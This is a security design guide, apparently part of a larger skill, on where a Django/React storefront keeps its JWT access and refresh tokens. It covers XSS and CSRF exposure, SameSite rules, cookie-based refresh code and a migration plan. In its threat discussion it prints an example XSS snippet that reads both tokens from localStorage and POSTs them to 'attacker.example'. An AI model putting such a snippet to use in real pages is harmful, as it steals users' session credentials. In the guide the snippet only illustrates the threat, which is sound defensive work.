# Token Storage and Lifetime Strategy

This file owns where the access and refresh tokens live in the browser, how long each lasts, and exactly what an attacker gets under XSS, CSRF, and a page refresh for each option.

## Measured current state

From `daf_backend/settings.py`:

```python
SIMPLE_JWT = {
    'ACCESS_TOKEN_LIFETIME': timedelta(minutes=15),
    'REFRESH_TOKEN_LIFETIME': timedelta(days=7),
    'ROTATE_REFRESH_TOKENS': True,
    'BLACKLIST_AFTER_ROTATION': True,
    'AUTH_HEADER_TYPES': ('Bearer',),
}

REST_AUTH = {
    'LOGIN_SERIALIZER': 'api.serializers.CustomLoginSerializer',
    'USE_JWT': True,
    'JWT_AUTH_HTTPONLY': False,   # <- both tokens ship in the JSON body
}
```

From `daf front/daf frontend/src/authentication/auth.jsx` (login handler):

```jsx
localStorage.setItem("access_token", res.data.access);
localStorage.setItem("refresh_token", res.data.refresh);
localStorage.setItem("user", JSON.stringify(res.data.user || { email }));
```

From `daf front/daf frontend/src/js/api.js` — `withCredentials` appears nowhere in the repository. That is finding **N1** (both tokens in localStorage) and **N7** (no CSRF story, no `withCredentials`) in one screen of code.

Rotation and blacklisting are already correct. The lifetime is acceptable. The storage location is the problem.

## The three options

| | (a) Both in localStorage | (b) Refresh in httpOnly cookie, access in memory | (c) Both in memory |
|---|---|---|---|
| What an XSS steals | Access **and** refresh. 7 days of silent access, exfiltrated in one line, usable from the attacker's own machine. | The current access token only — and only for its remaining lifetime, from inside the victim's page. The refresh token is unreadable by JS. | Access token only, same as (b), but nothing survives the tab. |
| What a CSRF needs | Nothing — CSRF is irrelevant. The token is sent by explicit JS, not by the browser. | A cross-site POST to `/auth/token/refresh/` that the browser will attach the cookie to. Blocked by `SameSite=Lax` + cookie `path` scoping; add a CSRF token when `SameSite=None` is required. | Nothing — no ambient credential exists. |
| Tab refresh / new tab | Instant. Tokens are already there. | One extra round trip on boot: `POST /auth/token/refresh/` (cookie is sent automatically) then `GET /auth/me/`. ~200 ms of a loading state. | User is logged out. Every refresh, every new tab. |
| What breaks | Nothing. That is the trap. | Boot sequence must be written. Cross-site cookie needs `SameSite=None; Secure` for the Netlify/Vercel origins. `CustomLoginView.get_response()` must be rewritten (see below). | Session lifetime collapses to one tab-lifetime. Unusable for a storefront where users leave tabs open. |
| Verdict | Explicit opt-out only | **Default** | Special cases only |

### Option (a): both tokens in localStorage — the current design

`localStorage` is a same-origin key/value store readable by any script running on the origin. There is no `httpOnly` equivalent. Any of the following gives an attacker a script on your origin:

- a stored XSS in a product description, review body, or party name rendered with `dangerouslySetInnerHTML`
- a compromised or typosquatted npm dependency in the Vite bundle
- a third-party analytics/chat/pixel script loaded from a CDN that is later compromised
- a browser extension the user installed

Any one of them runs:

```js
fetch('https://attacker.example/c', {
  method: 'POST',
  body: JSON.stringify({
    a: localStorage.getItem('access_token'),
    r: localStorage.getItem('refresh_token'),
  }),
});
```

The refresh token is the whole prize. It is valid for **7 days**, it is not bound to the browser, IP, or user agent, and `ROTATE_REFRESH_TOKENS` does not help here — the attacker simply rotates it themselves, and if they rotate before the victim does, the *victim* is the one who gets logged out. There is no signal to the user or to you that this happened.

Note the second-order problem in this codebase: `Users.jsx`, `SalesReport.jsx`, `Dashboard.jsx`, `Reviews.jsx`, `Orders.jsx`, and `Categories.jsx` each call `localStorage.getItem("access_token")` directly and hand-build an `Authorization` header on a bare `axios` call. Every one of those is a site that must change if the token moves. Centralising token access is a prerequisite for changing storage at all.

### Option (b): refresh token in an httpOnly cookie, access token in memory — recommended

The refresh token becomes invisible to JavaScript. The access token lives in a module-scoped variable, never in any storage the browser persists.

What this buys, precisely: it does not stop XSS. An attacker with script execution can still call your API as the user for as long as the page is open and the access token is valid. What it stops is **exfiltration to a durable, offline, long-lived credential**. The attack is downgraded from "attacker owns this account for a week from their own laptop" to "attacker can act inside the victim's live tab for the next ten minutes." That is a real and large reduction, and it is the honest limit of what this control does. Do not sell it as XSS immunity.

Cookie attributes, all four required:

| Attribute | Value | Why |
|---|---|---|
| `HttpOnly` | `True` | The entire point. Removes the cookie from `document.cookie` and from any JS read. |
| `Secure` | `True` in production | Prevents the cookie going out over plaintext. Note `settings.py` currently hardcodes `DEBUG = True`, which makes every `not DEBUG` security flag in that file evaluate to `False`. Fix `DEBUG` first or this attribute is silently off in production. |
| `SameSite` | see table below | Controls whether the browser attaches the cookie to cross-site requests — the CSRF lever. |
| `Path` | `/auth/token/refresh/` | Scopes the cookie so it is transmitted on exactly one endpoint instead of every API call. Shrinks both the CSRF surface and the log/proxy exposure surface to a single route. |

## SameSite, for this project's actual origins

`SameSite` is evaluated against the *registrable domain* (eTLD+1), not the origin. This matters here because `CORS_ALLOWED_ORIGINS` contains frontends on three different registrable domains:

| Frontend origin | API origin | Same site? | Required SameSite |
|---|---|---|---|
| `https://delhialuminium.com` | `https://api.delhialuminium.com` | Yes — both are `delhialuminium.com` | `Lax` works |
| `https://www.delhialuminium.com` | `https://api.delhialuminium.com` | Yes | `Lax` works |
| `https://delhialuminium.netlify.app` | `https://api.delhialuminium.com` | **No** | `None; Secure` required |
| `https://daf-frontend-ruby.vercel.app` | `https://api.delhialuminium.com` | **No** | `None; Secure` required |
| `http://localhost:5173` | `https://api.delhialuminium.com` | **No** | `None; Secure` required — and `Secure` cookies are not sent from `http://localhost` to a cross-site target in some browser configurations. Run the dev API over HTTPS or proxy it through Vite so it is same-origin in dev. |

The three modes:

- **`Strict`** — the cookie is withheld on every cross-site request including top-level navigation. Strongest, and for a refresh cookie scoped to `/auth/token/refresh/` it is actually viable, because nothing ever navigates to that path. It breaks nothing here as long as your frontend is same-site with the API.
- **`Lax`** — withheld on cross-site subrequests (including all `fetch`/XHR and all cross-site `POST`), sent on top-level `GET` navigation. Since the refresh call is a cross-site `POST` from JS, `Lax` **blocks CSRF against the refresh endpoint outright**. This is the right default for the `delhialuminium.com` pair.
- **`None`** — attached to every cross-site request. Requires `Secure`. CSRF protection is now entirely on you.

**The rule: if you deploy on the Netlify or Vercel origin, you are on `SameSite=None` and you must add a CSRF token. If you consolidate onto `delhialuminium.com`, use `Lax` and the token becomes defence in depth.** Consolidating the frontend onto the same registrable domain as the API is the cheapest security win available in this list.

### The CSRF token, when you need one

With `SameSite=None`, an attacker page can make the victim's browser POST to `/auth/token/refresh/` with the cookie attached. They cannot *read* the response (CORS blocks that — `CORS_ALLOWED_ORIGINS` does not include the attacker), so they cannot steal the new access token. But `ROTATE_REFRESH_TOKENS = True` means the attacker's forced refresh **rotates and blacklists the victim's refresh token**, logging the victim out on their next real refresh. That is a denial-of-service CSRF, and it is enough reason to close the hole.

Use the double-submit cookie pattern, which needs no server-side session:

```python
# api/csrf.py
import hmac
import secrets

from django.conf import settings
from rest_framework.exceptions import PermissionDenied

CSRF_COOKIE_NAME = 'daf_csrf'
CSRF_HEADER_NAME = 'HTTP_X_DAF_CSRF'


def issue_csrf_token(response):
    """Set a random, JS-readable token alongside the httpOnly refresh cookie."""
    token = secrets.token_urlsafe(32)
    response.set_cookie(
        key=CSRF_COOKIE_NAME,
        value=token,
        max_age=int(settings.SIMPLE_JWT['REFRESH_TOKEN_LIFETIME'].total_seconds()),
        httponly=False,          # deliberately readable: the SPA must echo it back
        secure=not settings.DEBUG,
        samesite='None' if settings.CROSS_SITE_FRONTEND else 'Lax',
        path='/',
    )
    return response


def require_csrf(request):
    """Compare the cookie value against the header value, constant-time."""
    cookie = request.COOKIES.get(CSRF_COOKIE_NAME, '')
    header = request.META.get(CSRF_HEADER_NAME, '')
    if not cookie or not hmac.compare_digest(cookie, header):
        raise PermissionDenied('CSRF check failed.')
```

The attacker's cross-site page can cause the *cookie* to be sent but cannot read it (it is on a different origin) and therefore cannot set the matching header. `hmac.compare_digest` rather than `==` for the same reason as everywhere else in this skill — see `03-otp.md`.

Note `settings.py` already defines `CSRF_TRUSTED_ORIGINS` with the same six entries as `CORS_ALLOWED_ORIGINS`. That setting governs Django's *session*-based CSRF middleware and does nothing for a DRF JWT endpoint. Do not mistake its presence for CSRF protection on the API.

## Implementation

### Backend: mint the refresh token into a cookie

The critical project-specific trap: `CustomLoginView` in `api/views.py` **overrides `get_response()` and hand-mints tokens**, bypassing dj-rest-auth's cookie plumbing entirely:

```python
class CustomLoginView(LoginView):
    def get_response(self):
        user = self.user
        refresh = RefreshToken.for_user(user)
        data = {
            "access": str(refresh.access_token),
            "refresh": str(refresh),
            "user": CustomUserSerializer(user).data
        }
        return Response(data)
```

Because of this override, setting `REST_AUTH['JWT_AUTH_HTTPONLY'] = True` and `JWT_AUTH_REFRESH_COOKIE` in `settings.py` will have **no effect at all**. The tokens will keep arriving in the JSON body. You must change the view.

```python
# api/cookies.py
from django.conf import settings

REFRESH_COOKIE_NAME = 'daf_refresh'
REFRESH_COOKIE_PATH = '/auth/token/refresh/'


def _samesite():
    # 'None' is mandatory when the SPA is served from a different registrable
    # domain than the API (netlify.app / vercel.app). 'Lax' when both are
    # under delhialuminium.com.
    return 'None' if getattr(settings, 'CROSS_SITE_FRONTEND', False) else 'Lax'


def set_refresh_cookie(response, refresh_token: str):
    response.set_cookie(
        key=REFRESH_COOKIE_NAME,
        value=refresh_token,
        max_age=int(settings.SIMPLE_JWT['REFRESH_TOKEN_LIFETIME'].total_seconds()),
        httponly=True,
        secure=not settings.DEBUG,
        samesite=_samesite(),
        path=REFRESH_COOKIE_PATH,
    )
    return response


def clear_refresh_cookie(response):
    response.delete_cookie(
        key=REFRESH_COOKIE_NAME,
        path=REFRESH_COOKIE_PATH,
        samesite=_samesite(),
    )
    return response
```

```python
# api/views.py
from dj_rest_auth.views import LoginView
from rest_framework.response import Response
from rest_framework_simplejwt.tokens import RefreshToken

from .cookies import set_refresh_cookie
from .csrf import issue_csrf_token
from .serializers import CustomUserSerializer


class CustomLoginView(LoginView):
    def get_response(self):
        user = self.user
        refresh = RefreshToken.for_user(user)

        # The refresh token is NOT in this body. Only the short-lived access
        # token, which the SPA holds in memory and never persists.
        response = Response({
            "access": str(refresh.access_token),
            "user": CustomUserSerializer(user).data,
        })
        set_refresh_cookie(response, str(refresh))
        issue_csrf_token(response)
        return response
```

The refresh endpoint must read the token from the cookie rather than the body. `dj_rest_auth.jwt_auth.get_refresh_view()` already does this when `JWT_AUTH_REFRESH_COOKIE` is configured, but since this project hand-rolls login, write the matching view explicitly so the two halves cannot drift:

```python
# api/views.py
from rest_framework import status
from rest_framework.permissions import AllowAny
from rest_framework.views import APIView
from rest_framework_simplejwt.exceptions import TokenError
from rest_framework_simplejwt.tokens import RefreshToken

from .cookies import REFRESH_COOKIE_NAME, clear_refresh_cookie, set_refresh_cookie
from .csrf import require_csrf


class CookieTokenRefreshView(APIView):
    permission_classes = [AllowAny]
    authentication_classes = []          # the cookie IS the credential here

    def post(self, request):
        require_csrf(request)

        raw = request.COOKIES.get(REFRESH_COOKIE_NAME)
        if not raw:
            return Response({'detail': 'No refresh token.'},
                            status=status.HTTP_401_UNAUTHORIZED)
        try:
            refresh = RefreshToken(raw)
        except TokenError:
            return clear_refresh_cookie(
                Response({'detail': 'Invalid refresh token.'},
                         status=status.HTTP_401_UNAUTHORIZED)
            )

        access = str(refresh.access_token)

        # ROTATE_REFRESH_TOKENS + BLACKLIST_AFTER_ROTATION: blacklist the token
        # we just consumed and issue a fresh one, so a stolen refresh token has
        # a one-use lifetime rather than seven days.
        if settings.SIMPLE_JWT.get('ROTATE_REFRESH_TOKENS'):
            if settings.SIMPLE_JWT.get('BLACKLIST_AFTER_ROTATION'):
                try:
                    refresh.blacklist()
                except AttributeError:
                    pass                  # blacklist app not installed
            refresh.set_jti()
            refresh.set_exp()
            refresh.set_iat()

        response = Response({'access': access})
        set_refresh_cookie(response, str(refresh))
        return response
```

Register it in `daf_backend/urls.py` in place of `get_refresh_view()`:

```python
path('auth/token/refresh/', CookieTokenRefreshView.as_view(), name='token_refresh'),
```

Logout must clear the cookie *and* blacklist, or the user "logs out" while a live 7-day credential sits in their browser:

```python
class CookieLogoutView(APIView):
    permission_classes = [AllowAny]

    def post(self, request):
        raw = request.COOKIES.get(REFRESH_COOKIE_NAME)
        if raw:
            try:
                RefreshToken(raw).blacklist()
            except (TokenError, AttributeError):
                pass                       # already expired/blacklisted: fine
        return clear_refresh_cookie(Response({'detail': 'Logged out.'}))
```

### Frontend: access token in memory

Replace every `localStorage.getItem("access_token")` in the app with a single module. There are at least fourteen call sites today; they must all route through this.

```js
// src/js/tokenStore.js
// The access token lives here and nowhere else. No localStorage, no
// sessionStorage, no cookie readable by JS. Cleared when the tab closes.

let accessToken = null;
let listeners = new Set();

export function getAccessToken() {
  return accessToken;
}

export function setAccessToken(token) {
  accessToken = token;
  listeners.forEach((fn) => fn(token));
}

export function clearAccessToken() {
  accessToken = null;
  listeners.forEach((fn) => fn(null));
}

export function onAccessTokenChange(fn) {
  listeners.add(fn);
  return () => listeners.delete(fn);
}
```

```js
// src/js/api.js
import axios from 'axios';
import { getAccessToken, setAccessToken, clearAccessToken } from './tokenStore';

const api = axios.create({
  baseURL: import.meta.env.VITE_API_URL,
  // Required for the httpOnly refresh cookie to be sent at all.
  // Pairs with CORS_ALLOW_CREDENTIALS = True, which settings.py already sets.
  withCredentials: true,
});

api.interceptors.request.use((config) => {
  const token = getAccessToken();
  if (token) {
    config.headers = config.headers || {};
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

function readCsrfCookie() {
  const match = document.cookie.match(/(?:^|;\s*)daf_csrf=([^;]*)/);
  return match ? decodeURIComponent(match[1]) : '';
}

let refreshPromise = null;

export async function refreshAccessToken() {
  // Single-flight: many 401s in parallel must produce one refresh call, or
  // rotation will blacklist the token mid-flight and log the user out.
  if (!refreshPromise) {
    refreshPromise = axios
      .post(
        `${api.defaults.baseURL}/auth/token/refresh/`,
        {},                                   // body is empty: cookie carries it
        { withCredentials: true, headers: { 'X-DAF-CSRF': readCsrfCookie() } },
      )
      .then((res) => {
        setAccessToken(res.data.access);
        return res.data.access;
      })
      .catch((err) => {
        clearAccessToken();
        throw err;
      })
      .finally(() => {
        refreshPromise = null;
      });
  }
  return refreshPromise;
}

api.interceptors.response.use(
  (res) => res,
  async (error) => {
    const original = error.config;
    if (!error.response || error.response.status !== 401 || original._retry) {
      return Promise.reject(error);
    }
    if (original.url?.includes('/auth/token/refresh/')) {
      return Promise.reject(error);
    }
    original._retry = true;
    try {
      const token = await refreshAccessToken();
      original.headers.Authorization = `Bearer ${token}`;
      return api(original);
    } catch (err) {
      clearAccessToken();
      return Promise.reject(err);
    }
  },
);

export default api;
```

### Frontend: the boot sequence

This is the piece option (b) adds and (a) does not need. On every full page load the app has no access token, so it must exchange the cookie for one before it can render anything authenticated. `AuthProvider` in `src/authentication/auth.jsx` gains a `booting` state:

```jsx
// src/authentication/auth.jsx
import { createContext, useCallback, useContext, useEffect, useState } from 'react';
import api, { refreshAccessToken } from '../js/api';
import { clearAccessToken } from '../js/tokenStore';

const AuthContext = createContext(null);

export const AuthProvider = ({ children }) => {
  const [user, setUser] = useState(null);
  const [booting, setBooting] = useState(true);

  const fetchCurrentUser = useCallback(async () => {
    try {
      const res = await api.get('/auth/me/');
      setUser(res.data);
      return res.data;
    } catch {
      setUser(null);
      return null;
    }
  }, []);

  useEffect(() => {
    let alive = true;
    (async () => {
      try {
        await refreshAccessToken();     // cookie -> access token in memory
        if (alive) await fetchCurrentUser();
      } catch {
        if (alive) setUser(null);       // no valid cookie: anonymous visitor
      } finally {
        if (alive) setBooting(false);
      }
    })();
    return () => {
      alive = false;
    };
  }, [fetchCurrentUser]);

  const logout = useCallback(async () => {
    try {
      await api.post('/auth/logout/');   // blacklists + clears the cookie
    } finally {
      clearAccessToken();
      setUser(null);
    }
  }, []);

  return (
    <AuthContext.Provider value={{ user, booting, setUser, fetchCurrentUser, logout }}>
      {children}
    </AuthContext.Provider>
  );
};

export const useAuth = () => useContext(AuthContext);
```

Note what disappeared: `localStorage.getItem("user")` as the initial state. There is no cached role to tamper with. The `user` object starts `null` and is only ever populated from a `/auth/me/` response over a verified JWT. That is the structural fix for **S8**, and `02-server-verified-roles.md` covers why it must be enforced at the route level too.

One structural caveat in this codebase: `App.jsx` mounts `<AuthProvider>` **outside** `<Router>`. That is fine for the provider itself, but it means the provider cannot call `useNavigate()`. Keep navigation decisions inside `ProtectedRoute`, which is inside the router.

## Access token lifetime

Target **5 to 15 minutes**. The current 15 is at the top of the acceptable band; 10 is a better default for this project because it halves the stale-claims window described in `06-session-revocation.md`.

The lifetime is a direct tradeoff between two costs:

| Shorter (5 min) | Longer (60 min) |
|---|---|
| A stolen access token expires fast | A stolen access token is useful for an hour |
| A demoted admin loses access in ≤5 min | A demoted admin keeps `is_staff: true` for an hour — this is finding **N4** |
| 12 refresh round trips per hour of active use | 1 refresh per hour |
| More blacklist rows (see cleanup in `06`) | Fewer rows |

Twelve extra requests per active hour per user is not a meaningful load for this application. Choose 10 minutes.

Never raise the access lifetime as a fix for "users keep getting logged out." The access lifetime **is** your revocation window: at 30 days, logout, deactivation, password change and role demotion all stop working for a month, because an access token is verified by signature and never consults a table.

That symptom has eight causes and seven are frontend bugs — a network-error refresh that clears the session, a cross-tab rotation race, a missing single-flight lock, clock skew. [09-session-longevity.md](./09-session-longevity.md) has the symptom → cause table and the reproduction steps. Fix the cause. If a longer session is genuinely wanted, raise `REFRESH_TOKEN_LIFETIME` only — rotation makes it a sliding window, so an active user is never logged out regardless.

## Refresh rotation and blacklisting

`ROTATE_REFRESH_TOKENS = True` and `BLACKLIST_AFTER_ROTATION = True` are already set. What they actually do:

- **Rotation** — each successful refresh returns a *new* refresh token; the old one is consumed. A stolen refresh token therefore has an effective lifetime of "until the legitimate user next refreshes," not seven days.
- **Blacklisting** — the consumed token is written to `token_blacklist_blacklistedtoken` and will be rejected if presented again. Without this, rotation is cosmetic: the old token would still validate.

The valuable side effect: if an attacker steals a refresh token and uses it, the legitimate user's next refresh presents a blacklisted token and fails. You get a detectable signal — a `401` on refresh for a user who was active seconds ago. Log it. Repeated occurrences for one account are a strong theft indicator.

`rest_framework_simplejwt.token_blacklist` is already in `INSTALLED_APPS`, so the tables exist. Cleanup is covered in `06-session-revocation.md`.

## Why "we have HTTPS" does not mitigate XSS token theft

This objection comes up every time and it is worth answering precisely, because the reasoning failure behind it recurs elsewhere.

TLS protects data **in transit between two endpoints**. It guarantees that a party sitting on the network — a hostile Wi-Fi access point, an ISP, a compromised router in Dhaka or anywhere else on the path — cannot read or modify the bytes.

XSS is not on the network. XSS is code executing **inside the browser, on your origin, after TLS has already decrypted everything**. The injected script:

- calls `localStorage.getItem('refresh_token')` — a local memory read, no network involved, nothing for TLS to protect
- calls `fetch('https://attacker.example/c', ...)` — which is itself an HTTPS request. TLS faithfully and correctly encrypts the stolen token on its way to the attacker.

TLS is doing its job perfectly in both steps. It is protecting the attacker's exfiltration channel.

The same confusion produces two adjacent errors worth naming:

- *"The API is HTTPS so the JWT can't be tampered with."* The JWT's integrity comes from its HMAC signature, not from TLS. That is why the JWT — and only the JWT — is trustworthy in the S8 post-mortem, and why `localStorage.user` is not.
- *"We have CORS so nobody else can call our API."* CORS restricts what *other origins'* JavaScript may read from a response. An XSS runs *on your origin*. CORS does not apply. Neither does `CORS_ALLOWED_ORIGINS`, nor `CSRF_TRUSTED_ORIGINS`.

The controls that actually reduce XSS token theft, in order of effect: do not persist the refresh token where JS can read it (option b); eliminate the injection (escape output, never `dangerouslySetInnerHTML` on user content); add a Content-Security-Policy that blocks the exfiltration destination and inline script.

## The explicit opt-out: staying on option (a)

Option (a) may be chosen deliberately — for example, to ship a deadline without the boot-sequence rewrite. If so, record the decision, and be clear about what has been accepted:

> **Accepted risk (N1):** the refresh token is stored in `localStorage`. Any script execution on the frontend origin — from a stored XSS in product/review/party content, a compromised npm dependency, or a third-party script — yields a 7-day, machine-portable credential for the affected account. If that account is staff, it yields the admin panel. There is no detection and no user-visible signal.

If you take the opt-out, these compensating controls are not optional:

1. **Cut `REFRESH_TOKEN_LIFETIME` to 24 hours.** This is the single biggest reduction available without touching the frontend. Users log in daily; a stolen token dies in a day instead of a week.
2. **Ship a Content-Security-Policy** with `script-src 'self'` and an explicit `connect-src` allowlist. This blocks the most common exfiltration path even when injection succeeds.
3. **Audit every `dangerouslySetInnerHTML`** and every place server-supplied HTML is rendered. Product descriptions are the highest-risk field in this application.
4. **Never store `user` in `localStorage` as an authority.** This is independent of the token question and is non-negotiable — see `02-server-verified-roles.md`. Even under option (a), roles come from `/auth/me/`.
5. **Centralise token access into `tokenStore.js` anyway,** even if it reads from `localStorage` internally. This turns the future migration from a fourteen-file change into a one-file change.

Do not take the opt-out for staff accounts specifically. If splitting the effort, migrate the admin and inventory flows to option (b) first; the blast radius there is the whole catalogue, the whole order book, and every user record.

## Migration order

1. Fix `DEBUG` so it reads from the environment. Until then `Secure` is `False` in production and every cookie control below is decorative.
2. Consolidate the frontend onto `delhialuminium.com` if possible, so `SameSite=Lax` suffices and the CSRF token becomes defence in depth rather than the only barrier.
3. Add `src/js/tokenStore.js` and route all fourteen `localStorage.getItem("access_token")` call sites through it, including the six admin pages that bypass the `api` instance. No behaviour change yet — this step is pure refactor and should be shipped alone.
4. Add `CookieTokenRefreshView`, `set_refresh_cookie`, and the CSRF helpers; change `CustomLoginView.get_response()` to stop returning `refresh` in the body.
5. Add the boot sequence to `AuthProvider` and the `booting` state to `ProtectedRoute`.
6. Drop `ACCESS_TOKEN_LIFETIME` to 10 minutes.
7. Delete `refresh_token` from `localStorage` on next login for every existing session, so old stored tokens do not linger after the migration.
